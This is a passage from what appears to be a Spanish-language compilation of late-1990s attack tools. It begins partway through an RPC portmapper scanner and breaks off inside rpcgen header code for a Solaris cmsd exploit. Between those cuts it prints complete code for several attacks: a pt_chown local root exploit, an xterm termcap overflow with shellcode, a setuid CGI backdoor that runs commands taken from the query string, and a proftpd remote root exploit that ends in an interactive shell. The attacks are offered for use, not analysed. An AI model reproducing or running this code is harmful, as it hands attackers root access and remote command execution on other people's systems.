        PMAPVERS, &sockett, 50, 500)) == NULL) {

	if (!timeout) {if (verbose) {
			printf(".");	
			fflush(stdout);
			}
	}
	timeout=0;
	alarm(0);
    	signal(SIGALRM,SIG_DFL);
    	return 0;
  }

  alarm(0);
  signal(SIGALRM,SIG_DFL);
  
  if (clnt_call(client, PMAPPROC_DUMP, (xdrproc_t) xdr_void, NULL,
        (xdrproc_t) xdr_pmaplist,  &head, minutetimeout) != RPC_SUCCESS)
  { /* can't contact portmapper */
    if (verbose) {printf("-"); fflush(stdout);}
    return 0;
  }

  /* if we've reached this, PMAPPROC_DUMP was successful */

  (void)clnt_destroy(client);

  i=0;
  found=0;
  first=0;
  foundCur=0;
  while (procnums[i]) {
	foundCur=searchlist(head, procnums[i]);
  	found=foundCur || found;
	if ((first == 0) && (found==1)){  
		first=1;
		fputs(host, outFile);
		sprintf(outbuf, ": %i", procnums[i]);
		fputs(outbuf, outFile);
		fflush(outFile);
	}
	else if (foundCur) {
		sprintf(outbuf, ", %i", procnums[i]);
		fputs(outbuf, outFile);
		fflush(outFile);
	}
	i++;
  }

  if (found) {
	if (verbose) {printf("*"); fflush(stdout);}
	return 1;
  }


  if (verbose) {printf("."); fflush(stdout); }
  return 0;
}

int searchlist(struct pmaplist* list, int progid) {
   if (list != NULL)
    for (; list != NULL; list = list->pml_next)  {
        if (list->pml_map.pm_prog==progid)  {
                return 1;
        }
    } /* end of for loop */

    return 0; /* no matches */
}

/* res - resolve hostname */
unsigned long int res(char *p)
{  
   struct hostent *h;   
   unsigned long int resHost;  
   h=gethostbyname(p);
   if (h != NULL) memcpy(&resHost,h->h_addr,h->h_length);
   else resHost=inet_addr(p);
   return resHost;
}


/*  getpts - converts command line input into an array of procedure id numbers 
 *  This function was mostly taken from Fyodor's excellent nmap 
 *  utility.  It has been slighty modified to fit procedure id numbers instead
 *  of port numbers.
 */
unsigned int *getpts(char *origexpr) {
	int numports;
	int exlen = strlen(origexpr);
	char *p, *q;
	unsigned int *tmp, *ports;   
	int i=0, j=0,start,end;
	char *expr = strdup(origexpr);
	char *mem = expr; 

	ports = malloc(65536 * sizeof(unsigned int)); /* was safe_malloc */
	for(;j < exlen; j++)
	if (expr[j] != ' ') expr[i++] = expr[j];
	expr[i] = '\0';
	exlen = i;
	i=0;
	while((p = strchr(expr,','))) {
	*p = '\0';
  	if (*expr == '-') 
		{start = 1; end = atoi(expr+ 1);}
	else {
    		start = end = atoi(expr);
    		if ((q = strchr(expr,'-')) && *(q+1) ) end = atoi(q + 1);
    		else if (q && !*(q+1)) end = INT_MAX;
  	}
	if (start < 1 || start > end ) {
		printf("Your port specifications are illegal!\n");
		exit(-1);
	}
  	for(j=start; j <= end; j++)  {
    		if (i < INT_MAX)
   	   		ports[i++] = j;
    		else {
			printf("Too many ports specified\n"); exit(-1);}
  		} 
  		expr = p + 1;
	}
	if (*expr == '-') {
  		start = 1;
  		end = atoi(expr+ 1);
	}
	else {
	  start = end = atoi(expr);
	  if ((q =  strchr(expr,'-')) && *(q+1) ) end = atoi(q+1);
	  else if (q && !*(q+1)) end = 65535;
	}
	for(j=start; j <= end; j++)  {
		if (i < INT_MAX)
    			ports[i++] = j; 
	  	else { 
			printf("Too many ports specified\n");
			exit(-1);
	  	}
	}

	if (start < 1 || start > end ) {
		printf("Your port specifications are illegal!\n");
		exit(-1);
	}


	numports = i;
	/* ports[i++] = j;*/
	ports[i++] = 0;
	tmp = realloc(ports, numports * sizeof(int));
	free(mem);
	return tmp;
}
 
 -------------------------------------------------
 ---[ Nombre  :  rh60.pt_chown.root.c
 ---[ Sistema :  RedHat 6.0
 ---[ Causa   :  r00t
 ---[ Creditos:  ???
 -------------------------------------------------

     /* rh60.pt_chown.root.c.txt
        pt_chown for RedHat 6.0 has a vulnerability that can lead to
        a root comprimise.
      */
     int main(int a,char* b[]) {

     char* c="\nclear;echo huhuhu, it worked...;id;sleep 2\n";
     int i=0,x=open(b[1],1); // Expect writable, allocated
     // (eg. by screen) /dev/ttyXX as 1st arg 

     if (x<0) {
     perror(b[1]);
     exit(1);
     }

     if (!fork()) {
     dup2(x,3);
     execl("/usr/libexec/pt_chown","pt_chown",0);
     perror("pt_chown");
     exit(1);

     }
     sleep(1);
     for (i;i<strlen(c);i++) ioctl(x,0x5412,&c[i]);

     }

 -------------------------------------------------
 ---[ Nombre  :  libtermcap xterm exploit
 ---[ Sistema :  Linux
 ---[ Causa   :  r00t
 ---[ Creditos:  m0f0 / [D4RKCYDE]
 -------------------------------------------------

/*
   ****************************************************
   ***          libtermcap xterm exploit            ***
   ***                by m0f0 1999                  ***
   ***                                              ***
   ***          it works for xterm/nxterm           ***
   ***          Tested Slackware 3.5, 3.6           ***
   ****************************************************
*/

#include <stdio.h>
#define BUF_SIZE 5000
#define POS_RET  2000
#define POS_SEP  3000
#define RETADDR  0xbfffefef
#define EGG      "/tmp/egg_termcap"

// shellcode
char shellcode[] = // 48 caracteres
    "\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa"
    "\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08\x04"
    "\x03\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff"
    "\xff\xff/bin/sh";

void main (int argc, char *argv[]) {
  int i;
  FILE *f;
  char buf[BUF_SIZE];
  long retaddr, offset;
	
  printf ("\n");
  printf ("****************************************** \n");
  printf ("* libtermcap xterm exploit, by m0f0 1999 * \n");
  printf ("****************************************** \n\n");
  printf ("Use : %s [offset] \n", argv[0]);

  offset = 0;
  if (argc>1) {
    offset = atol (argv[1]);
  }

  retaddr = RETADDR + offset;
  printf ("Return Address = 0x%x \n",retaddr);
	

  // Fill buffer with NOP's
  memset (buf, 0x90, BUF_SIZE);
  buf[BUF_SIZE]=0;
	
  // Set termcap file header and sep
  memcpy (buf, "xterm|", 6);
  memcpy (buf+POS_SEP,":\\",2);

  // Return Address
  for (i=POS_RET; i<=POS_SEP-10; i+=4) {
    *(long*)(buf+i) = (long) retaddr;
  }

  // Copy shellCode
  for (i=0; i<strlen(shellcode); i++) {
    buf[i+2000] = shellcode[i];
  }

  // Write EGG_TERMCAP
  f = fopen (EGG,"w");
  fprintf (f,"%s",buf);
  fclose (f);
	
  // Export TERMCAP
  setenv ("TERMCAP", EGG, 1);

  // Run program
  execl ("/usr/X11R6/bin/xterm","xterm",NULL);

}

 -------------------------------------------------
 ---[ Nombre  : gH CGI Backdoor 1.0
 ---[ Sistema : Cualquiera que admita CGI 
 ---[ Causa   : Backdoor CGI
 ---[ Creditos: blasphemy / [gH]
 -------------------------------------------------

/*
 * gH CGI Backdoor 1.0
 *
 * Install:
 * -------------------------------
 *   % gcc -o gH.cgi gH-cgi.c
 *   % chown root.root gH.cgi
 *   % chmod 4755 gH.cgi
 * -------------------------------
 * Tested with apache 1.3.4
 *
 * Note: place gH.cgi in a cgi-bin directory
 *
 *      blasphemy (cornoil@netscape.net)
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define	TITLE	"gH CGI Backdoor"

char x2c(char *what);
int header();
int footer();

int
main() {
   FILE *out;
   char *qs = (char *)malloc(256);
   int x = 0, i = 0, c = 0, f = 0;
	qs = getenv("QUERY_STRING");
	if (qs != NULL) {
		for (x = 0, i = 0; qs[i]; x++, i++) {
			if ((qs[x] = qs[i]) == '%') {
				qs[x] = x2c(&qs[i + 1]);
				i += 2;
			  }
		  }
		qs[x] = '\0';
		for (x = 0; qs[x]; x++) {
			if (qs[x] == '+') {
				qs[x] = ' ';
			  }
		  }
		header(qs);
		out = popen(qs, "r");
		if (out != NULL) {
			while (c != EOF) {
				c = fgetc(out);
				if (c != EOF && c != '\0') {
					printf("%c", (char) c);
					f++;
				  }
			  }
			pclose(out);
		}
		if (f == 0 && strcmp(qs, "") != 0)
			printf("gH: %s: command not found\n", qs);
	}
	footer();
   return(0);
}

char x2c(char *what)
{
  register char digit;
          
  digit = (what[0] >= 'A' ? ((what[0] & 0xdf) - 'A')+10 : (what[0] - '0'));
  digit *= 16;
  digit += (what[1] >= 'A' ? ((what[1] & 0xdf) - 'A')+10 : (what[1] - '0'));
  return (digit);
}

int
header(char *qs) {
	printf("Content-type: text/html\n\n");
	printf("<html>\n<head><title>%s</title></head>\n", TITLE);
	printf("<body bgcolor=\"#ffffff\">\n");
	printf("<dir><h1>%s</h1>\n", TITLE);
        printf("<ISINDEX prompt=\"Command to Execute: \">\n");
	printf("<br><b>Command output:</b> [<em>%s</em>]\n", qs);
        printf("<br><pre>\n");
}

int
footer() {
	printf("</pre>\n</dir>\n</body></html>\n");
}


 -------------------------------------------------
 ---[ Nombre  : proftpd-1.2.0 remote root exploit
 ---[ Sistema : Servers ftp con proftpd-1.2.0
 ---[ Causa   : r00t
 ---[ Creditos: ??
 -------------------------------------------------

/*
 * !!!! Private .. ... distribute !!!!
 *
 * <pro.c> proftpd-1.2.0 remote root exploit (beta2)
 * (Still need some code, but it works fine)
 *
 * Offset: Linux Redhat 6.0
 * 0 -> proftpd-1.2.0pre1 
 * 0 -> proftpd-1.2.0pre2
 * 0 -> proftpd-1.2.0pre3
 * (If this dont work, try changing the align)
 *
 * Usage:
 * $ cc pro.c -o pro
 * $ pro 1.1.1.1 ftp.linuz.com /incoming 
 *
 * ****
 * Comunists are still alive ph34r
 * A lot of shit to : #cybernet@ircnet
 * Greez to Soren,Draven,DaSnake,Nail^D0D,BlackBird,scaina,cliffo,m00n,phroid,Mr-X,inforic
 *          Dialtone,AlexB,naif,etcetc
 * without them this puppy cant be spreaded uaz uaz uaz
 * ****    
 *          

#include <stdio.h> 
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <time.h>
#include <string.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <netdb.h>

#define RET 0xbffff550
#define ALINEA 0

void logintoftp();
void sh();
void mkd(char *);
void put(char *);
int max(int, int);

char shellcode[] =
"\x90\x90\x31\xc0\x31\xdb\xb0\x17"
"\xcd\x80\x31\xc0\xb0\x17\xcd\x80"
"\x31\xc0\x31\xdb\xb0\x2e\xcd\x80"
"\xeb\x4f\x31\xc0\x31\xc9\x5e\xb0"
"\x27\x8d\x5e\x05\xfe\xc5\xb1\xed"
"\xcd\x80\x31\xc0\x8d\x5e\x05\xb0"
"\x3d\xcd\x80\x31\xc0\xbb\xd2\xd1"
"\xd0\xff\xf7\xdb\x31\xc9\xb1\x10"
"\x56\x01\xce\x89\x1e\x83\xc6\x03"
"\xe0\xf9\x5e\xb0\x3d\x8d\x5e\x10"
"\xcd\x80\x31\xc0\x88\x46\x07\x89"
"\x76\x08\x89\x46\x0c\xb0\x0b\x89"
"\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd"
"\x80\xe8\xac\xff\xff\xff";

char tmp[256];
char name[128], pass[128];

int sockfd;
struct sockaddr_in server, yo;
char inicio[20];

int main(int argc, char **argv) {

char sendln[1024], recvln[4048], buf1[1000], buf2[200];
struct hostent *host;
char *p, *q;
int len;
int offset = 0;
int align = 0;
int i;

if(argc < 4){
	printf("usage: pro <your_ip> <host> <dir> [-l name pass] [offset align]\n");
        printf("If dont work, try different align values (0 to 3)\n");
        exit(0); }
                
if(argc >= 5){
        if(strcmp(argv[4], "-l") == 0){
        strncpy(name, argv[5], 128);
        strncpy(pass, argv[6], 128);
} else {
        offset = atoi(argv[4]); }
        if(argc == 9)
        offset = atoi(argv[7]);
        align = atoi(argv[8]); }
        
sprintf(inicio, "%s", argv[1]);
                
if(name[0] == 0 && pass[0] == 0){
        strcpy(name, "anonymous");
        strcpy(pass, "a@a.es"); }

bzero(&server,sizeof(server));
bzero(recvln,sizeof(recvln));
bzero(sendln,sizeof(sendln));
server.sin_family=AF_INET;
server.sin_port=htons(21);

if((host = gethostbyname(argv[2])) != NULL) {
        bcopy(host->h_addr, (char *)&server.sin_addr, host->h_length);
} else {
        if((server.sin_addr.s_addr = inet_addr(argv[2]))<1) {
	        perror("Obteniendo ip");
                exit(0); }
        }

bzero((char*)&yo,sizeof(yo));
yo.sin_family = AF_INET;

if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
	perror("socket()");
        exit(0); }

if((bind(sockfd, (struct sockaddr *)&yo, sizeof(struct sockaddr)))<0) {
        perror("bind()");
        exit(0); }

if(connect(sockfd, (struct sockaddr *)&server, sizeof(server)) < 0){
        perror("connect()");
        exit(0); }
        
printf("Destination_ip: %s \nDestination_port: %d\nSource_ip: %s \nSource_port: %d\n",
inet_ntoa(server.sin_addr), ntohs(server.sin_port), inet_ntoa(yo.sin_addr),
ntohs(yo.sin_port));
        
printf("Connected\n");
getchar();
               
while((len = read(sockfd, recvln, sizeof(recvln))) > 0){
        recvln[len] = '\0';
        if(strchr(recvln, '\n') != NULL)
        break; }
                        
logintoftp(sockfd);
printf("Logged\n");
bzero(sendln, sizeof(sendln));

memset(buf1, 0x90, 800);
memcpy(buf1, argv[3], strlen(argv[3]));
mkd(argv[3]);
p = &buf1[strlen(argv[3])];
q = &buf1[799];
*q = '\x00';
while(p <= q) {
	strncpy(tmp, p, 100);
        mkd(tmp);
        p+=100; }

mkd(shellcode);
mkd("bin");
mkd("sh");

memset(buf2, 0x90, 100);
for(i=4-ALINEA-align; i<96; i+=4)
        *(long *)&buf2[i] = RET + offset;
p = &buf2[0];
q = &buf2[99];
strncpy(tmp, p, 100);
put(tmp);

sh(sockfd);

close(sockfd);
printf("EOF\n");
}

void mkd(char *dir) {
        
char snd[1024], rcv[1024];
char buf[1024], *p;
int n;
        
bzero(buf,sizeof(buf));
p=buf;

for(n=0;n<strlen(dir);n++) {
	if(dir[n]=='\xff') {
        	*p='\xff';
                p++; }
        *p=dir[n];
        p++; }

sprintf(snd,"MKD %s\r\n",buf);
write(sockfd,snd,strlen(snd));
bzero(snd,sizeof(snd));
sprintf(snd,"CWD %s\r\n",buf);
write(sockfd,snd,strlen(snd));
bzero(rcv,sizeof(rcv));

while((n=read(sockfd,rcv,sizeof(rcv)))>0) {
	rcv[n]=0;
	if(strchr(rcv,'\n')!=NULL)
        	break; }
        return;
}

void put(char *dir) {

char snd[1024], rcv[1024];
char buf[1024], *p;
int n;
int sockete, nsock;
int port;
int octeto_in[4];
char *oct;
        
port=getpid()+1024;

yo.sin_port=htons(port);
        
bzero(buf,sizeof(buf));
p=buf;
for(n=0;n<strlen(dir);n++) {
	if(dir[n]=='\xff') {
        	*p='\xff';
                p++; }
        *p=dir[n];
        p++; }

oct=(char *)strtok(inicio,".");
octeto_in[0]=atoi(oct);
oct=(char *)strtok(NULL,".");
octeto_in[1]=atoi(oct);
oct=(char *)strtok(NULL,".");
octeto_in[2]=atoi(oct);
oct=(char *)strtok(NULL,".");
octeto_in[3]=atoi(oct);

sprintf(snd,"PORT %d,%d,%d,%d,%d,%d\r\n",octeto_in[0],octeto_in[1],
octeto_in[2],octeto_in[3],port / 256,port % 256);
write(sockfd,snd,strlen(snd));

// socket
// bind
// listen
if((sockete=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1) {
        perror("Socket()");
        exit(0); }
                        
if((bind(sockete,(struct sockaddr *)&yo,sizeof(struct sockaddr)))==-1) {
        perror("Bind()");
        close(sockete);
	exit(0); }

if(listen(sockete,10)==-1) {
        perror("Listen()");
        close(sockete);
        exit(0); }

bzero(snd, sizeof(snd));
sprintf(snd, "STOR %s\r\n", buf);
write(sockfd, snd, strlen(snd));

// accept
// write
// close 
if((nsock=accept(sockete,(struct sockaddr *)&server,(int *)sizeof(struct sockaddr)))==-1) {
        perror("accept()");
        close(sockete);
        exit(0); }
        
write(nsock, "aaaaaaaaa", 10);
 
close(sockete);
close(nsock);

bzero(rcv, sizeof(rcv));
while((n = read(sockfd, rcv, sizeof(rcv))) > 0){
	rcv[n] = 0;
        if(strchr(rcv, '\n') != NULL)
        	break; }
        return; 
}

void logintoftp() {

char snd[1024], rcv[1024];
int n;

printf("Logging %s/%s\n", name, pass);
memset(snd, '\0', 1024);
sprintf(snd, "USER %s\r\n", name);
write(sockfd, snd, strlen(snd));

while((n=read(sockfd, rcv, sizeof(rcv))) > 0){
	rcv[n] = 0;
        if(strchr(rcv, '\n') != NULL)
	        break; }

memset(snd, '\0', 1024);
sprintf(snd, "PASS %s\r\n", pass);
write(sockfd, snd, strlen(snd));

while((n=read(sockfd, rcv, sizeof(rcv))) > 0){
	rcv[n] = 0;
        if(strchr(rcv, '\n') != NULL)
        	break; }
        return;
}

void sh() {
        
char snd[1024], rcv[1024];
fd_set rset;
int maxfd, n;

strcpy(snd, "cd /; uname -a; pwd; id;\n");
write(sockfd, snd, strlen(snd));

for(;;){
	FD_SET(fileno(stdin), &rset);
        FD_SET(sockfd, &rset);
        maxfd = max(fileno(stdin), sockfd) + 1;
        select(maxfd, &rset, NULL, NULL, NULL);
        if(FD_ISSET(fileno(stdin), &rset)){
        	bzero(snd, sizeof(snd));
                fgets(snd, sizeof(snd)-2, stdin);
                write(sockfd, snd, strlen(snd)); }
        if(FD_ISSET(sockfd, &rset)){
                bzero(rcv, sizeof(rcv));
                if((n = read(sockfd, rcv, sizeof(rcv))) == 0){
        	        printf("EOF.\n");
                        exit(0); }
                if(n < 0){
                        perror("read()");
                        exit(-1); }
                 fputs(rcv, stdout); }
        }
}

int max(int x, int y) {

if(x > y)
	return(x);
else
	return(y);
}


 -------------------------------------------------
 ---[ Nombre  : cmsd warez
 ---[ Sistema : SunOS / Solaris 
 ---[ Causa   : r00t
 ---[ Creditos: Aleph One / aleph1@underground.org
 -------------------------------------------------


/*
 *
 * cmsd warez
 *
 * executes /tmp/iss
 *
 * gcc -o c c.c -lrpcsvc -lnsl -lsocket
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <rpc/rpc.h>
#include <netdb.h>
#include <arpa/inet.h>

char c0de[]=
"\x90\x08\x3f\xff"  /* and %g0, -1, %o0 - 0 in o0 */
"\x82\x10\x20\x8d"  /* mov 0x8d, %g1 - 0x8d==141==SYS_seteuid in g1 */
"\x91\xd0\x20\x08"  /* ta 8 - seteuid(0); */
"\x90\x08\x3f\xff"  /* and %g0, -1, %o0 - 0 in o0 */
"\x82\x10\x20\x17"  /* mov 0x17, %g1 - 0x17==23==SYS_setuid in g1 */
"\x91\xd0\x20\x08"  /* ta 8 - setuid(0); */
"\x2d\x0b\xdd\x1b"  /* sethi %hi(0x2f746c00), %l6 */
"\xac\x15\xa1\x70"  /* or %l6, 0x170, %l6 - "/tmp" */
"\x2f\x0b\xda\x5c"  /* sethi %hi(0x2f697000), %l7 */
"\xae\x15\xe3\x73"  /* or %l7, 0x373, %l7 - "/iss" */
"\x90\x0b\x80\x0e"  /* and %sp, %sp, %o0 - addr of "/tmp/iss" in o0 */
"\x92\x03\xa0\x0c"  /* add %sp, 0xc, %o1 - addr of ptr->"/tmp/iss" o1 */
"\x94\x1a\x80\x0a"  /* xor %o2, %o2, %o2 - 0 in o2 (envp) */
"\x9c\x03\xa0\x14"  /* add %sp, 0x14, %sp - (0x14==20) give space */
"\xec\x3b\xbf\xec"  /* std  %l6, [ %sp + -20 ] - store "/tmp/iss" */
"\xc0\x23\xbf\xf4"  /* clr [ %sp + -12 ] - null term "/tmp/iss" */
"\xdc\x23\xbf\xf8"  /* st %sp, [ %sp + -8 ] - make ptr->"/tmp/iss" */
"\xc0\x23\xbf\xfc"  /* clr [ %sp + -4 ] - null term ptr array (argv) */
"\x82\x10\x20\x3b"  /* mov 0x3b, %g1 - 0x3b==59==SYS_execve in g1 */
"\x91\xd0\x20\x08"  /* ta 8 - execve(&"/tmp/iss",&(ptr->"/tmp/iss"),0) */
"\x90\x1b\xc0\x0f"  /* xor %o7, %o7, %o0 - 0 in o0 */
"\x82\x10\x20\x01"  /* mov 1, %g1 - 1==SYS_exit in g1 */
"\x91\xd0\x20\x08"; /* ta 8 - exit(0) */

#define X_OFFSET  5500
#define RW_OFFSET 800
#define NOPS      700
#define ALIGN     (2000+sizeof(unsigned long)*7)
#define REG_W_SIZ 64
#define PRE_RET   (REG_W_SIZ-3*sizeof(unsigned long))
#define OFBUFSIZ  (BUFSIZ+REG_W_SIZ+NOPS+sizeof(c0de)-sizeof(unsigned long))

char cname[] = "root@ISS";

/* ----- rpcgen ----- */

/*
 * Please do not edit this file.
 * It was generated using rpcgen.
 */

#ifndef _RTABLE4_H_RPCGEN
#define	_RTABLE4_H_RPCGEN

#include <rpc/rpc.h>

typedef char *Buffer;

enum Transaction {
	add = 0,
	cm_remove = 1
};
typedef enum Transaction Transaction;

enum Interval {
	single = 0,
	daily = 1,
	weekly = 2,
	biweekly = 3,
	monthly = 4,
	yearly = 5,
	nthWeekday = 6,
	everyNthDay = 7,
	everyNthWeek = 8,
	everyNthMonth = 9,
	otherPeriod = 10,
	monThruFri = 11,
	monWedFri = 12,
	tueThur = 13,
	daysOfWeek = 14
};
typedef enum Interval Interval;

struct Period {
	Interval period;
	int nth;
	long enddate;
};
typedef struct Period Period;

enum Event_Type {
	appointment = 0,
	reminder = 1,
	otherTag = 2,
	holiday = 3,
	toDo = 4
};
typedef enum Event_Type Event_Type;

enum Options {
	do_all = 0,
	do_one = 1,
	do_forward = 2
};
typedef enum Options Options;

struct Tag {
	Event_Type tag;
	int showtime;
	struct Tag *next;
};
typedef struct Tag Tag;

enum Privacy_Level {
	public = 0,
	private = 1,
	semiprivate = 2
};
typedef enum Privacy_Level Privacy_Level;

struct Attribute {
	struct Attribute *next;
	Buffer attr;
	Buffer value;
	Buffer clientdata;
};
typedef struct Attribute Attribute;

typedef Attribute *Attr;

struct Except {
	int ordinal;
	struct Except *next;
};
typedef struct Except Except;

typedef Except *Exception;

struct Id {
	long tick;
	long key;
};
typedef struct Id Id;

struct Uid {
	struct Id appt_id;
	struct Uid *next;
};
typedef struct Uid Uid;

enum Appt_Status {
	active = 0,
	pendingAdd = 1,
	pendingDelete = 2,
	committed = 3,
	cancelled = 4,
	completed = 5
};
typedef enum Appt_Status Appt_Status;

struct Appt {
	struct Id appt_id;
	struct Tag *tag;
	int duration;
	int ntimes;
	Buffer what;
	struct Period period;
	Buffer author;
	Buffer client_data;
	struct Except *exception;
	struct Attribute *attr;
	Appt_Status appt_status;
	Privacy_Level privacy;
	struct Appt *next;
};
typedef struct Appt Appt;

struct Abb_Appt {
	struct Id appt_id;
	struct Tag *tag;
	Buffer what;
	int duration;
	struct Period period;
	struct Abb_Appt *next;
	Appt_Status appt_status;
	Privacy_Level privacy;
};
typedef struct Abb_Appt Abb_Appt;

struct Apptid {
	struct Id *oid;
	struct Appt *new_appt;
	Options option;
};
typedef struct Apptid Apptid;

struct Reminder {
	struct Id appt_id;
	long tick;
	Attribute attr;
	struct Reminder *next;
};
typedef struct Reminder Reminder;

enum Table_Res_Type {
	AP = 0,
	RM = 1,
	AB = 2,
	ID = 3
};
typedef enum Table_Res_Type Table_Res_Type;

struct Table_Res_List {
	Table_Res_Type tag;
	union {
		Appt *a;
		Reminder *r;
		Abb_Appt *b;
		Uid *i;
	} Table_Res_List_u;
};
typedef struct Table_Res_List Table_Res_List;

enum Access_Status {
	access_ok = 0,
	access_added = 1,
	access_removed = 2,
	access_failed = 3,
	access_exists = 4,
	access_partial = 5,
	access_other = 6,
	access_notable = 7,
	access_notsupported = 8,
	access_incomplete = 9
};
typedef enum Access_Status Access_Status;

struct Table_Res {
	Access_Status status;
	Table_Res_List res;
};
typedef struct Table_Res Table_Res;
#define access_none   0x0     /* owner only */
#define access_read   0x1
#define access_write  0x2
#define access_delete 0x4
#define access_exec   0x8     /* execution permission is a hack! */
#define WORLD "world"	/* special user */

struct Access_Entry {
	Buffer who;
	int access_type;
	struct Access_Entry *next;
};
typedef struct Access_Entry Access_Entry;

struct Access_Args {
	Buffer target;
	Access_Entry *access_list;
};
typedef struct Access_Args Access_Args;

struct Range {
	long key1;
	long key2;
	struct Range *next;
};
typedef struct Range Range;

struct Keyrange {
	long key;
	long tick1;
	long tick2;
	struct Keyrange *next;
};
typedef struct Keyrange Keyrange;

struct Uidopt {
	struct Id appt_id;
	Options option;
	struct Uidopt *next;
};
typedef struct Uidopt Uidopt;

enum Table_Args_Type {
	TICK_4 = 0,
	APPTID = 1,
	UID = 2,
	APPT = 3,
	RANGE = 4,
	KEYRANGE = 5,
	UIDOPT = 6
};
typedef enum Table_Args_Type Table_Args_Type;

struct Args {
	Table_Args_Type tag;
	union {
		long tick;
		Apptid apptid;
		Uid *key;
		Appt *appt;
		Range *range;
		Keyrange *keyrange;
		Uidopt *uidopt;
	} Args_u;
};
typedef struct Args Args;

struct Table_Args {
	Buffer target;
	Args args;
	int pid;
};
typedef struct Table_Args Table_Args;

struct Registration {
	Buffer target;
	u_long prognum;
	u_long versnum;
	u_long procnum;
	struct Registration *next;
	int pid;
};
typedef struct Registration Registration;

struct Table_Op_Args {
	Buffer target;
	Buffer new_target;
};
typedef struct Table_Op_Args Table_Op_Args;

enum Table_Status {
	ok = 0,
	duplicate = 1,
	badtable = 2,
	notable = 3,
	denied = 4,
	other = 5,
	tbl_not_owner = 6,
	tbl_exist = 7,
	tbl_notsupported = 8
};
typedef enum Table_Status Table_Status;

enum Registration_Status {
	registered = 0,
	failed = 1,
	deregistered = 2,
	confused = 3,
	reg_notable = 4
};
typedef enum Registration_Status Registration_Status;

/*
 * rtable_delete and rtable_change take over the functionality of
 * rtable_delete_instance and rtable_change_instance repectively.
 * rtable_delete_instance and rtable_change_instance are now dummy
 * routines exist for backward compatibility purpose and return
 * access_notsupported.
 */

extern Appt* make_appt();
extern void destroy_appt();
extern void destroy_list();
extern Appt *copy_appt();
extern Appt *copy_semiprivate_appt();
extern Abb_Appt *make_abbrev_appt();
extern void destroy_abbrev_appt();
extern Abb_Appt *copy_abbrev_appt();
extern Abb_Appt *appt_to_abbrev();
extern Abb_Appt *appt_to_semiprivate_abbrev();
extern Reminder* make_reminder();
extern void destroy_reminder();
extern Reminder* copy_reminder();
extern Uid* make_keyentry();
extern void destroy_keyentry();
extern Uid* copy_keyentry();
extern Access_Entry* make_access_entry();
extern Access_Entry* copy_access_list();
extern void destroy_access_list();
extern Abb_Appt *copy_single_abbrev_appt();
extern Attribute *make_attr();

#define	TABLEPROG ((unsigned long)(100068))
#define	TABLEVERS ((unsigned long)(4))
#define	rtable_ping ((unsigned long)(0))
extern  void * rtable_ping_4();
#define	rtable_lookup ((unsigned long)(1))
extern  Table_Res * rtable_lookup_4();
#define	rtable_lookup_next_larger ((unsigned long)(2))
extern  Table_Res * rtable_lookup_next_larger_4();
#define	rtable_lookup_next_smaller ((unsigned long)(3))
extern  Table_Res * rtable_lookup_next_smaller_4();
#define	rtable_lookup_range ((unsigned long)(4))
extern  Table_Res * rtable_lookup_range_4();
#define	rtable_abbreviated_lookup_range ((unsigned long)(5))
extern  Table_Res * rtable_abbreviated_lookup_range_4();
#define	rtable_insert ((unsigned long)(6))
extern  Table_Res * rtable_insert_4();
#define	rtable_delete ((unsigned long)(7))
extern  Table_Res * rtable_delete_4();
#define	rtable_delete_instance ((unsigned long)(8))
extern  Table_Res * rtable_delete_instance_4();
#define	rtable_change ((unsigned long)(9))
extern  Table_Res * rtable_change_4();
#define	rtable_change_instance ((unsigned long)(10))
extern  Table_Res * rtable_change_instance_4();
#define	rtable_lookup_next_reminder ((unsigned long)(11))
extern  Table_Res * rtable_lookup_next_reminder_4();
#define	rtable_check ((unsigned long)(12))
extern  Table_Status * rtable_check_4();
#define	rtable_flush_table ((unsigned long)(13))
extern  Table_Status * rtable_flush_table_4();
#define	rtable_size ((unsigned long)(14))
extern  int * rtable_size_4();
#define	register_callback ((unsigned long)(15))
extern  Registration_Status * register_callback_4();
#define	deregister_callback ((unsigned long)(16))
extern  Registration_Status * deregister_callback_4();
#define	rtable_set_access ((unsigned long)(17))
extern  Access_Status * rtable_set_access_4();
#define	rtable_get_access ((unsigned long)(18))
extern  Access_Args * rtable_get_access_4();
#define	rtable_abbreviated_lookup_key_range ((unsigned long)(19))
extern  Table_Res * rtable_abbreviated_lookup_key_range_4();
#define	rtable_gmtoff ((unsigned long)(20))
extern  long * rtable_gmtoff_4();
#define	rtable_create ((unsigned long)(21))
extern  Table_Status * rtable_create_4();
#define	rtable_remove ((unsigned long)(22))
extern  Table_Status * rtable_remove_4();
#define	rtable_rename ((unsigned long)(23))
extern  Table_Status * rtable_rename_4();
extern int tableprog_4_freeresult();

/* the xdr functions */
extern bool_t xdr_Buffer();
extern bool_t xdr_Transaction();
extern bool_t xdr_Interval();
extern bool_t xdr_Period();
extern bool_t xdr_Event_Type();
extern bool_t xdr_Options();
extern bool_t xdr_Tag();
extern bool_t xdr_Privacy_Level();
extern bool_t xdr_Attribute();
extern bool_t xdr_Attr();
extern bool_t xdr_Except();
extern bool_t xdr_Exception();
extern bool_t xdr_Id();
extern bool_t xdr_Uid();
extern bool_t xdr_Appt_Status();
extern bool_t xdr_Appt();
extern bool_t xdr_Abb_Appt();
extern bool_t xdr_Apptid();
extern bool_t xdr_Reminder();
extern bool_t xdr_Table_Res_Type();
extern bool_t xdr_Table_Res_List();
extern bool_t xdr_Access_Status();
extern bool_t xdr_Table_Res();
extern bool_t xdr_Access_Entry();
extern bool_t xdr_Access_Args();
extern bool_t xdr_Range();
extern bool_t xdr_Keyrange();
extern bool_t xdr_Uidopt();
extern bool_t xdr_Table_Args_Type();
extern bool_t xdr_Args();
extern bool_t xdr_Table_Args();
extern bool_t xdr_Registration();
extern bool_t xdr_Table_Op_Args();
extern bool_t xdr_Table_Status();
extern bool_t xdr_Registration_Status();

#endif /* !_RTABLE4_H_RPCGEN */

/*
 * Please do not edit this file.
 * It was generated using rpcgen.
